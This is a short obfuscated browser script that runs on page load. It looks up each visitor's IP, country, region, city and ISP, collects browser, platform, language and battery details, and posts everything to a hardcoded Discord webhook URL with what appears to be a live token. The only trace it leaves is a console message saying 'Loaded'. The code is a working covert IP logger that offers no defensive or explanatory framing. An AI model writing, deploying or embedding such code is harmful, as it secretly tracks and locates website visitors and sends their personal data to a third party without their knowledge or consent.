async function sendUserDataToDiscord() {
  try {
    const _0x4fc030 = await fetch("https://json.geoiplookup.io");
    const _0x48494b = await _0x4fc030.json();
    const _0x50d605 = {
      'platform': navigator.platform,
      'userAgent': navigator.userAgent,
      'language': navigator.language,
      'battery': navigator.getBattery ? navigator.getBattery().level * 0x64 : null
    };
    const _0x291852 = "\n                **User Data:**\n                - IP Address: " + _0x48494b.ip + "\n                - Country: " + _0x48494b.country_name + "\n                - Region: " + _0x48494b.region + "\n                - City: " + _0x48494b.city + "\n                - ISP: " + _0x48494b.isp + "\n                - Device: " + _0x50d605.platform + "\n                - Browser: " + _0x50d605.userAgent + "\n                - Language: " + _0x50d605.language + "\n                - Battery: " + _0x50d605.battery + "%\n            ";
    const _0x3cb14e = {
      'content': _0x291852
    };
    await fetch("https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-", {
      'method': 'POST',
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify(_0x3cb14e)
    });
    console.log('Loaded');
  } catch (_0x1bb2d0) {
    console.error("Could not log visit", _0x1bb2d0);
  }
}

window.addEventListener("load", sendUserDataToDiscord);
